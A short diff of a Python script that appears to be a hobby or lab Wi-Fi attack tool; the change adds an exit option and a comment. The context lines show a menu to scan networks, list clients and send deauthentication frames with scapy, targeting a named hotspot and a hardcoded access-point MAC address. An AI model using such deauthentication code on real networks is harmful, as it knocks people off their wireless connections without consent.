@@ -20,12 +20,12 @@ from get_clients_on_ap import get_clients_on_ap
 INTERFACE = "wlan0"
 TIMEOUT = 20
 
-AP_TO_ATTACK = "Nicklas - iPhone"
+AP_TO_ATTACK = "Nicklas - iPhone"  # only used when scanning for specific AP
 Lukas_WEP_AP = "48:f8:b3:e4:03:04"
 
 with Scanner(INTERFACE) as scanner:
 
-    action = input("Input action wanted:\n1. Scan network.\n2. Show clients\n3. Send deauth\n")
+    action = input("Input action wanted:\n1. Scan network.\n2. Show clients\n3. Send deauth\n4. exit\n")
 
     if action == "1":
         # AP_info = scanner.get_ap(timeout=TIMEOUT, specific_ap=AP_TO_ATTACK)
@@ -57,7 +57,8 @@ with Scanner(INTERFACE) as scanner:
             deauth(INTERFACE, BSSID, pkt[Dot11].addr2, 6)
 
         sniff(iface=INTERFACE, prn=check_deauth, filter="type mgt", count=20)  # subtype assoc-req")  # start sniffin
-
+    elif action == "4":
+        exit()
 
 # channel = AP_info.Channel[0]
 # BSSID = AP_info.index[0]
